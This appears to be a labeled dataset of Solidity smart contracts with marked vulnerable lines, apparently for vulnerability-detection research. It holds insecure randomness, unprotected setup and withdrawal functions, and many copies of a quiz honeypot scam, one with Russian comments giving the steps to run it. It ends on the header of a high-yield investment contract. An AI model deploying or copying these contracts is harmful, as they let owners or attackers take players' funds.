		require(msg.value >= .001 ether && block.timestamp < gmapGame_expiration[gnGameID]);
		gmapGame_addresses[gnGameID].push(msg.sender);
		gmapGame_wagers[gnGameID].push(msg.value);
		gmapGame_balance[gnGameID] +=msg.value;
		gmapGame_runningbalances[gnGameID].push(gmapGame_balance[gnGameID]);
	}
	function zSynchGameID(uint nIndex, uint nExpiration) onlyOtherContract() public {
		gnGameID = nIndex;
		gmapGame_expiration[gnGameID] = nExpiration;
	}
	function zSetGameID(uint nIndex, uint nExpiration) onlyOwner() public {
		gnGameID = nIndex;
		gmapGame_expiration[gnGameID] = nExpiration;
		gobjOtherContract.zSynchGameID(gnGameID, nExpiration);
	}
	function zIncrementGameID(uint nExpiration) onlyOwner() public {
		gnGameID++;
		gmapGame_expiration[gnGameID] = nExpiration;
		gobjOtherContract.zSynchGameID(gnGameID, nExpiration);
	}
	function zGetGameID() onlyOwner() public view returns (uint) {
		return gnGameID;
	}
	function setOwner (address _owner) onlyOwner() public {
		gadrOwner = _owner;
	}
	function setOtherContract (address _othercontract) onlyOwner() public {
		gadrOtherContract = _othercontract;
		gobjOtherContract = MyInterface(gadrOtherContract);
	}
	function zgetOwner() onlyOwner() public view returns (address) {
		return gadrOwner;
	}
	function zgetOtherContract() onlyOwner() public view returns (address) {
		return gadrOtherContract;
	}
	function zgetPlayers(uint nIDOfGame) onlyOwner() public view returns (uint, uint, address[],uint[], uint[]) {
		return (gmapGame_balance[nIDOfGame], gmapGame_expiration[nIDOfGame], gmapGame_addresses[nIDOfGame], gmapGame_wagers[nIDOfGame],gmapGame_runningbalances[nIDOfGame]);
	}
	function zGetGameBalance() onlyOtherContract() public view returns (uint) {
		return (gmapGame_balance[gnGameID]);
	}
	function zRefundAllPlayers() onlyOwner() public {
		for (uint i = 0; i < gmapGame_addresses[gnGameID].length; i++) {
			gmapGame_addresses[gnGameID][i].transfer(gmapGame_wagers[gnGameID][i] - gcnTransferFee);
		}
	}
	function zGetBothContractBalances() public view onlyOwner() returns (uint, uint) {
		uint nOtherBalance = gobjOtherContract.zGetGameBalance();
		return (gmapGame_balance[gnGameID], nOtherBalance);
	}
	function zTransferFundsToOtherContract(uint nAmount) onlyOwner() public {
		gobjOtherContract.zReceiveFunds.value(nAmount)();
	}
	function zTransferFundsToOwner(uint nAmount) onlyOwner() public {
		gadrOwner.transfer(nAmount);
	}
	function zTransferLosingBets() onlyOwner() public {
		if (gmapGame_balance[gnGameID] != 0) {
			uint nOtherBalance = gobjOtherContract.zGetGameBalance();
			if (gmapGame_balance[gnGameID] <= nOtherBalance) {
				gobjOtherContract.zReceiveFunds.value(gmapGame_balance[gnGameID])();
			} else {
				if (nOtherBalance != 0) {
					gobjOtherContract.zReceiveFunds.value(nOtherBalance)();
				}
				for (uint i = 0; i < gmapGame_addresses[gnGameID].length; i++) {
					if (gmapGame_runningbalances[gnGameID][i] > nOtherBalance) {
						if (gmapGame_runningbalances[gnGameID][i] - nOtherBalance < gmapGame_wagers[gnGameID][i]) {
							gmapGame_addresses[gnGameID][i].transfer( (gmapGame_runningbalances[gnGameID][i] - nOtherBalance) - gcnTransferFee);
						} else {
							gmapGame_addresses[gnGameID][i].transfer(gmapGame_wagers[gnGameID][i] - gcnTransferFee);
						}
					}
				}
			}
		}
	}
	function zTransferWinningBets() onlyOwner() public {
		if (gmapGame_balance[gnGameID] != 0) {
			uint nPreviousRunningBalance = 0;
			uint nOtherBalance = gobjOtherContract.zGetGameBalance();
			for (uint i = 0; i < gmapGame_addresses[gnGameID].length; i++) {
				if (gmapGame_runningbalances[gnGameID][i] <= nOtherBalance) {
					gmapGame_addresses[gnGameID][i].transfer((gmapGame_wagers[gnGameID][i] * gcnWinMultipler / 100) - gcnTransferFee);
				} else {
					if (nPreviousRunningBalance < nOtherBalance) {
						gmapGame_addresses[gnGameID][i].transfer(((nOtherBalance - nPreviousRunningBalance) * gcnWinMultipler / 100) + (gmapGame_wagers[gnGameID][i] - (nOtherBalance - nPreviousRunningBalance)) - gcnTransferFee);
					} else {
						gmapGame_addresses[gnGameID][i].transfer(gmapGame_wagers[gnGameID][i] - gcnTransferFee);
					}
				}
				nPreviousRunningBalance = gmapGame_runningbalances[gnGameID][i];
			}
		}
	}
	function zKill() onlyOwner() public {
		selfdestruct(gadrOwner);
	}
}","[64, 65]"
"// Puzzle ""Fifteen"". 
// Numbers can be moved by puzzle owner to the empty place.
// The winner must put the numbers (1-4) in the first row in the correct order.
//
// Start position:
//---------------------
//| 15 | 14 | 13 | 12 |
//---------------------
//| 11 | 10 | 9  | 8  |
//---------------------
//| 7  | 6  | 5  | 4  |
//---------------------
//| 3  | 2  | 1  |    |
//---------------------
//
//site - https://puzzlefifteen.xyz/
pragma solidity ^0.4.21;
contract Payments {
  address public coOwner;
  mapping(address => uint256) public payments; 
  function Payments() public {
    //contract owner
    coOwner = msg.sender;
  }
  modifier onlyCoOwner() {
    require(msg.sender == coOwner);
    _;
  }
  function transferCoOwnership(address _newCoOwner) public onlyCoOwner {
    require(_newCoOwner != address(0));
    coOwner = _newCoOwner;
  }  
  function PayWins(address _winner) public {
	 require (payments[_winner] > 0 && _winner!=address(0) && this.balance >= payments[_winner]);
	 _winner.transfer(payments[_winner]);
  }
}
contract Fifteen is Payments {
  //puzzleId => row => column => value
  mapping (uint8 => mapping (uint8 => mapping (uint8 => uint8))) public fifteenPuzzles;
  mapping (uint8 => address) public puzzleIdOwner;
  mapping (uint8 => uint256) public puzzleIdPrice;
  uint256 public jackpot = 0;
  function initNewGame() public onlyCoOwner payable {
     //set start win pot
	 require (msg.value>0);
	 require (jackpot == 0); 
	 jackpot = msg.value;
	 uint8 row;
	 uint8 col;
	 uint8 num;
	 for (uint8 puzzleId=1; puzzleId<=6; puzzleId++) {
		num=15;
		puzzleIdOwner[puzzleId] = address(this);
		puzzleIdPrice[puzzleId] = 0.001 ether;
		for (row=1; row<=4; row++) {
			for (col=1; col<=4; col++) {
				fifteenPuzzles[puzzleId][row][col]=num;
				num--;
			}
		}
	 }
  } 
  function getPuzzle(uint8 _puzzleId) public constant returns(uint8[16] puzzleValues) {    
	 uint8 row;
	 uint8 col;
	 uint8 num = 0;
	 for (row=1; row<=4; row++) {
		for (col=1; col<=4; col++) {
			puzzleValues[num] = fifteenPuzzles[_puzzleId][row][col];
			num++;
		}
	 }	
  }
  function changePuzzle(uint8 _puzzleId, uint8 _row, uint8 _col, uint8 _torow, uint8 _tocol) public gameNotStopped {  
	 require (msg.sender == puzzleIdOwner[_puzzleId]);
	 require (fifteenPuzzles[_puzzleId][_torow][_tocol] == 0); //free place is number 0
	 require (_row >= 1 && _row <= 4 && _col >= 1 && _col <= 4 && _torow >= 1 && _torow <= 4 && _tocol >= 1 && _tocol <= 4);
	 require ((_row == _torow && (_col-_tocol == 1 || _tocol-_col == 1)) || (_col == _tocol && (_row-_torow == 1 || _torow-_row== 1)));
	 fifteenPuzzles[_puzzleId][_torow][_tocol] = fifteenPuzzles[_puzzleId][_row][_col];
	 fifteenPuzzles[_puzzleId][_row][_col] = 0;
	 if (fifteenPuzzles[_puzzleId][1][1] == 1 && 
	     fifteenPuzzles[_puzzleId][1][2] == 2 && 
		 fifteenPuzzles[_puzzleId][1][3] == 3 && 
		 fifteenPuzzles[_puzzleId][1][4] == 4) 
	 { // we have the winner - stop game
		msg.sender.transfer(jackpot);
		jackpot = 0; //stop game
	 }
  }
  function buyPuzzle(uint8 _puzzleId) public gameNotStopped payable {
    address puzzleOwner = puzzleIdOwner[_puzzleId];
    require(puzzleOwner != msg.sender && msg.sender != address(0));
    uint256 puzzlePrice = puzzleIdPrice[_puzzleId];
    require(msg.value >= puzzlePrice);
	//new owner
	puzzleIdOwner[_puzzleId] = msg.sender;
	uint256 oldPrice = uint256(puzzlePrice/2);
	//new price
	puzzleIdPrice[_puzzleId] = uint256(puzzlePrice*2);	
	//profit fee 20% from oldPrice ( or 10% from puzzlePrice )
	uint256 profitFee = uint256(oldPrice/5); 
	uint256 oldOwnerPayment = uint256(oldPrice + profitFee);
	//60% from oldPrice ( or 30% from puzzlePrice ) to jackpot
    jackpot += uint256(profitFee*3);
    if (puzzleOwner != address(this)) {
      puzzleOwner.transfer(oldOwnerPayment); 
	  coOwner.transfer(profitFee); 
    } else {
      coOwner.transfer(oldOwnerPayment+profitFee); 
	}
	//excess pay
    if (msg.value > puzzlePrice) { 
		msg.sender.transfer(msg.value - puzzlePrice);
	}
  }  
  modifier gameNotStopped() {
    require(jackpot > 0);
    _;
  }    
}",[35]
"// Puzzle ""Fifteen"".
// Numbers can be moved by puzzle owner to the empty place.
// The winner must put the numbers (1-4) in the first row in the correct order.
//
// Start position:
//---------------------
//| 15 | 14 | 13 | 12 |
//---------------------
//| 11 | 10 | 9  | 8  |
//---------------------
//| 7  | 6  | 5  | 4  |
//---------------------
//| 3  | 2  | 1  |    |
//---------------------
//
//site - https://puzzlefifteen.xyz/
pragma solidity ^0.4.21;
contract Payments {
  address public coOwner;
  mapping(address => uint256) public payments;
  function Payments() public {
    //contract owner
    coOwner = msg.sender;
  }
  modifier onlyCoOwner() {
    require(msg.sender == coOwner);
    _;
  }
  function transferCoOwnership(address _newCoOwner) public onlyCoOwner {
    require(_newCoOwner != address(0));
    coOwner = _newCoOwner;
  }
  function PayWins(address _winner) public {
	 require (payments[_winner] > 0 && _winner!=address(0) && this.balance >= payments[_winner]);
	 _winner.transfer(payments[_winner]);
  }
}
contract Fifteen is Payments {
  //puzzleId => row => column => value
  mapping (uint8 => mapping (uint8 => mapping (uint8 => uint8))) public fifteenPuzzles;
  mapping (uint8 => address) public puzzleIdOwner;
  mapping (uint8 => uint256) public puzzleIdPrice;
  uint256 private prevBlock;
  uint256 public jackpot = 0;
  function initNewGame(uint8[16] _Numbers) public onlyCoOwner payable {
     //set start win pot
	 //for example [15,14,13,12,1,2,3,4,7,6,5,11,10,9,8,0]
	 require (msg.value>0);
	 require (_Numbers.length == 16);
	 require (jackpot == 0);
	 jackpot = msg.value;
	 uint8 row=1;
	 uint8 col=1;
	 uint8 key;
	 for (uint8 puzzleId=1; puzzleId<=6; puzzleId++) {
		puzzleIdOwner[puzzleId] = address(this);
		puzzleIdPrice[puzzleId] = 0.002 ether;
	 }
	 for (key=0; key < 16; key++) {
		fifteenPuzzles[1][row][col]=_Numbers[key];
		fifteenPuzzles[2][row][col]=_Numbers[key];
		fifteenPuzzles[3][row][col]=_Numbers[key];
		fifteenPuzzles[4][row][col]=_Numbers[key];
		fifteenPuzzles[5][row][col]=_Numbers[key];
		fifteenPuzzles[6][row][col]=_Numbers[key];
		if (col==4 || col==8 || col==12) {
			col=0;
			row++;
		}
		col++;
	 }
  }
  function getPuzzle(uint8 _puzzleId) public constant returns(uint8[16] puzzleValues) {
	 uint8 row;
	 uint8 col;
	 uint8 num = 0;
	 for (row=1; row<=4; row++) {
		for (col=1; col<=4; col++) {
			puzzleValues[num] = fifteenPuzzles[_puzzleId][row][col];
			num++;
		}
	 }
  }
  function changePuzzle(uint8 _puzzleId, uint8 _row, uint8 _col, uint8 _torow, uint8 _tocol) public gameNotStopped {
	 require(block.number != prevBlock);
	 require (msg.sender == puzzleIdOwner[_puzzleId]);
	 require (fifteenPuzzles[_puzzleId][_torow][_tocol] == 0); //free place is number 0
	 require (_row >= 1 && _row <= 4 && _col >= 1 && _col <= 4 && _torow >= 1 && _torow <= 4 && _tocol >= 1 && _tocol <= 4);
	 require ((_row == _torow && (_col-_tocol == 1 || _tocol-_col == 1)) || (_col == _tocol && (_row-_torow == 1 || _torow-_row== 1)));
	 fifteenPuzzles[_puzzleId][_torow][_tocol] = fifteenPuzzles[_puzzleId][_row][_col];
	 fifteenPuzzles[_puzzleId][_row][_col] = 0;
	 prevBlock = block.number;
	 if (fifteenPuzzles[_puzzleId][1][1] == 1 &&
	     fifteenPuzzles[_puzzleId][1][2] == 2 &&
		 fifteenPuzzles[_puzzleId][1][3] == 3 &&
		 fifteenPuzzles[_puzzleId][1][4] == 4)
	 { // we have the winner - stop game
		msg.sender.transfer(jackpot);
		jackpot = 0; //stop game",[35]
"pragma solidity ^0.4.23;
contract FireCasino {
address public owner;
// The minimum bet a user has to make to participate in the game
uint256 public minimumBet = 1000000;
// The total amount of Ether bet for this current game
uint256 public totalBet;
// The total number of bets the users have made
uint256 public numberOfBets;
// The max user of bets that cannot be exceeded to avoid excessive gas consumption
// when distributing the prizes and restarting the game
uint256 public maximumBetsNr = 2;
// Save player when betting number
address[] public players;
// The number that won the last game
uint public numberWinner;
// Save player info
struct Player {
uint256 amountBet;
uint256 numberSelected;
}
// The address of the player and => the user info
mapping(address => Player) public playerInfo;
// Event watch when player win
event Won(bool _status, address _address, uint _amount);
modifier onlyOwner() {
require(msg.sender == owner);
_;
}
constructor() public payable {
owner = msg.sender;
minimumBet = 1000000;
}
// fallback
function() public payable {}
function kill() public {
if (msg.sender == owner)
selfdestruct(owner);
}
/// @notice The Bookie can withdraw money from the table
function collect() external onlyOwner{
    owner.transfer(address(this).balance);
}
/// @notice Check if a player exists in the current game
/// @param player The address of the player to check
/// @return bool Returns true is it exists or false if it doesn't
function checkPlayerExists(address player) public constant returns(bool) {
        for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player)
        return true;
    }
    return false;
}
/// @notice To bet for a number by sending Ether
/// @param numberSelected The number that the player wants to bet for. Must be between 1 and 10 both inclusive
function bet(uint256 numberSelected) public payable {
// Check that the player doesn't exists
require(!checkPlayerExists(msg.sender));
// Check that the number to bet is within the range
require(numberSelected <= 10 && numberSelected >= 1);
// Check that the amount paid is bigger or equal the minimum bet
require(msg.value >= minimumBet);
// Set the number bet for that player
playerInfo[msg.sender].amountBet = msg.value;
playerInfo[msg.sender].numberSelected = numberSelected;
numberOfBets++;
players.push(msg.sender);
totalBet += msg.value;
if (numberOfBets >= maximumBetsNr)
generateNumberWinner();
//We need to change this in order to be secure
}
/// @notice Generates a random number between 1 and 10 both inclusive.
/// Can only be executed when the game ends.
function generateNumberWinner() public {
uint256 numberGenerated = block.number % 10 + 1;
numberWinner = numberGenerated;
distributePrizes(numberGenerated);
}
/// @notice Sends the corresponding Ether to each winner then deletes all the
/// players for the next game and resets the `totalBet` and `numberOfBets`
function distributePrizes(uint256 numberWin) public {
address[100] memory winners;
address[100] memory losers;
uint256 countWin = 0;
uint256 countLose = 0;
for (uint256 i = 0; i < players.length; i++) {
address playerAddress = players[i];
if (playerInfo[playerAddress].numberSelected == numberWin) {
winners[countWin] = playerAddress;
countWin++;
} else {
losers[countLose] = playerAddress;
countLose++;
}
delete playerInfo[playerAddress];
}
if (countWin != 0) {
uint256 winnerEtherAmount = totalBet/countWin;
for (uint256 j = 0; j < countWin; j++){
if (winners[j] != address(0)) {
winners[j].transfer(winnerEtherAmount);
emit Won(true, winners[j], winnerEtherAmount);
}
}
}
for (uint256 l = 0; l < losers.length; l++){
if (losers[l] != address(0))
emit Won(false, losers[l], 0);
}
resetData();
}
// Restart game
function resetData() public {
players.length = 0;
totalBet = 0;
numberOfBets = 0;
}
}","[68, 102]"
"pragma solidity ^0.4.24;
contract Forwarder {
    string public name = ""Forwarder"";
    address private currentCorpBank_;
    bool needsBank_ = true;
    constructor() 
        public
    {
        //constructor does nothing.
    }
    function()
        public
        payable
    {
        // done so that if any one tries to dump eth into this contract, we can
        // just forward it to corp bank.
        if (currentCorpBank_ != address(0))
            currentCorpBank_.transfer(msg.value);
    }
    function deposit()
        public 
        payable
        returns(bool)
    {
        require(msg.value > 0, ""Forwarder Deposit failed - zero deposits not allowed"");
        require(needsBank_ == false, ""Forwarder Deposit failed - no registered bank"");
        currentCorpBank_.transfer(msg.value);
        return(true);
    }
    function withdraw()
        public
        payable
    {
        require(msg.sender == currentCorpBank_);
        currentCorpBank_.transfer(address(this).balance);
    }
    function setup(address _firstCorpBank)
        external
    {
        require(needsBank_ == true, ""Forwarder setup failed - corp bank already registered"");
        currentCorpBank_ = _firstCorpBank;
        needsBank_ = false;
    }
}",[35]
"pragma solidity ^0.4.7;
contract FreeMoney {
    function take() public payable {
        if (msg.value > 15 finney) {
            selfdestruct(msg.sender);
        }
    }
    function () public payable {}
}","[3, 4, 5]"
"pragma solidity ^0.4.11;
contract FreedomEthereum {
    event Hodl(address indexed hodler, uint indexed amount);
    event Party(address indexed hodler, uint indexed amount);
    mapping (address => uint) public hodlers;
    uint constant partyTime = 1554098401; //Morning April 1 2019
    function() payable {
        hodlers[msg.sender] += msg.value;
        Hodl(msg.sender, msg.value);
    }
    function party() {
        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);
        uint value = hodlers[msg.sender];
        hodlers[msg.sender] = 0;
        msg.sender.transfer(value);
        Party(msg.sender, value);
    }
}","[8, 12]"
"pragma solidity ^0.4.11;
contract FutureDeposit {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    address Owner;
    function transferOwnership(address to) public onlyOwner {
        Owner = to;
    }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.25 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function setRelease(uint newDate) public {
        Date = newDate;
    }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public { return withdrawTo(msg.sender, amount); }
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}","[30, 46]"
"pragma solidity ^0.4.20;
contract GAIN_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetQGame(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.23;
contract GIFT3600
{
    bool closed = false;
    uint unlockTime = 3600;
    address sender;
    address receiver;
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }
    function() public payable { }
}","[12, 21]"
"pragma solidity ^0.4.19;
contract GIFT_ENVELOPE
{
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == keccak256(pass) && now>giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function GetGift()
    public
    payable
    {
        if(msg.sender==reciver && now>giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    bytes32 hashPass;
    bool closed = false;
    address sender;
    address reciver;
    uint giftTime;
    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
            giftTime = now;
        }
    }
    function SetGiftTime(uint date)
    public
    {
        if(msg.sender==sender)
        {
            giftTime = date;
        }
    }
    function SetReciver(address _reciver)
    public
    {
        if(msg.sender==sender)
        {
            reciver = _reciver;
        }
    }
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    function() public payable{}
}",[17]
"pragma solidity ^0.4.20;
contract GO_GO_GO
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract GO_TO_PLAY
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"        bool isRegister;
    }
    mapping(address => userDataSet) public userMap;
    mapping(uint256 => address) public userlist;
    event TransferETH(address,uint256);
    event UserRegistered(address);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    // give token address of mainnet *the token you want to use in a contract*
    constructor(address _tokenAddress) public {
        token = ERC721FullBatchMint(address(_tokenAddress));
        Owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner(),""ERROR: Only for owner"");
        _;
    }
    function() external payable{
    }
    //register user to contract so they can start earning ethers
    function register() public {
        require(token.balanceOf(msg.sender) > 0,""ERROR: Get GSG-Official token to register"");
        require(msg.sender != address(0),""ERROR: zero address"");
        require(userMap[msg.sender].isRegister == false,""ERROR: User already registered"");
        userDataSet memory userdata;
        currentId++;
        registeredUsers++;
        userdata = userDataSet({
            claimedAmount: 0,
            timeFrame: now + 4 weeks,
            currentAmount: 0,
            timeForClaim: now + 90 days,
            isRegister: true
        });
        userMap[msg.sender] = userdata;
        userlist[currentId] = msg.sender;
        emit UserRegistered(msg.sender);
    }
    function hasRegistered() public view returns(bool) {
        return userMap[msg.sender].isRegister;
    }
    // user can claim one a month
    //claim amount is calculated according to how much balance and ethers we have in a contract
    function claim() public returns(bool){
        require(token.balanceOf(msg.sender) > 0,""ERROR: You need a token to clain ETH"");
        require(msg.sender != address(0), ""ERROR: zero address"");
        require(userMap[msg.sender].isRegister,""ERROR: Register first"");
        if(now >= userMap[msg.sender].timeForClaim) {
            userMap[msg.sender].currentAmount = 0;
            return true;
        }
        require(now >= userMap[msg.sender].timeFrame,""ERROR: Cannot claim before one month"");
        uint256 price = userMap[msg.sender].currentAmount;
        address(msg.sender).transfer(price);
        userMap[msg.sender].claimedAmount += price;
        userMap[msg.sender].currentAmount -= price;
        userMap[msg.sender].timeFrame = now +  4 weeks;
        userMap[msg.sender].timeForClaim = now + 90 days;
        emit TransferETH(msg.sender,price);
    }
    function calculatePriceETH() internal view returns(uint256) {
        uint256 contractBal = address(this).balance;
        uint256 balances1 = contractBal.mul(30).div(100);
        uint256 balances = balances1.div(registeredUsers);
        return balances;
    }
    function holdersBalance() public view returns(uint256) {
        if(now >= userMap[msg.sender].timeFrame){
            return userMap[msg.sender].currentAmount;
        }else{
            return 0;
        }
    }
    function distributeETH() public onlyOwner {
        uint256 id = currentId;
        uint256 price = calculatePriceETH();
        for(uint256 i=1; i<=id; i++){
            userMap[userlist[i]].currentAmount += price;
        }
    }
    function totalETH() public view returns(uint256) {
        return address(this).balance;
    }
    function owner() public view returns(address){
        return Owner;
    }
    function transferOwnerShip(address _address) public onlyOwner {
        emit OwnershipTransferred(owner(),_address);
        Owner = _address;
    }
   function stopPool() public onlyOwner {
       address(this).transfer(address(this).balance);
   }
}","[51, 77]"
"pragma solidity ^0.4.20;
contract GUESS_AND_GET_A_PRIZE
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"// 1. Выполнить StartGame с контракта с публичными данными
// 2. Выполнить NewQuestion с контракта
// 3. Убедится через web3 что хэш поменялся
// 4. С параметррами п1. Выполнить комманду StartGame с публичного аккаунта
pragma solidity ^0.4.20;
contract GUESS_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[37]
"pragma solidity ^0.4.20;
contract GUESS_IT
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract GUESS_THE_WORD
{
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract G_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
/**
*
*  -----------------------------------------Welcome to ""GETETHER""----------------------------------------
*
*  -----------------------------------DECENTRALIZED INVESTMENT PROJECT-----------------------------------
*
*   GAIN 5,55% per 24 HOURS (EVERY 5900 blocks Ethereum)
*   Life-long payments
*   Simple and reliable smart contract code
*
*   Web               - https://getether.me
